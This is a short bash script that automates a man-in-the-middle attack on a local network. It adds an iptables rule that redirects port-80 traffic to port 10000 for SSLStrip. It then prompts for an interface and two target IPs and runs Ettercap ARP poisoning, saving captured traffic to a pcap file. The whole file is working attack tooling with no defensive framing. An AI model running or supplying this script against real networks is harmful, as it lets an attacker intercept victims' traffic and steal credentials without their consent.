#! /bin/bash
# start Ettercap graphical
 
echo first configuring IP tables…
echo Enter interface for IP tables i.e. eth0, wlan0 etc
read -p 'Interface: ' intvar
iptables -A PREROUTING -t nat -i $intvar -p tcp --dport 80 -j REDIRECT --to-port 10000
read -r -p "Are you ready to start Ettercap and has SSLStrip been started? [y/N] " response
if [[ $response =~ ^([yY][eE][sS]|[yY])$ ]]
then
	echo Which interface to use i.e. eth0, wlan0 etc
	read -p 'Interface: ' intervar
	echo Enter filename
	read -p 'Filename: ' filevar
	echo Enter Target 1 IP
	read -p 'Target 1 IP: ' routervar
	echo Enter Target 2 IP - if required
	read -p 'Target 2 IP: ' targetvar
	ettercap -T -i $intervar -M ARP -w /root/etterlog/$filevar.pcap /$routervar//$targetvar/ output:
else
    echo ettercap cancelled
echo finished
fi

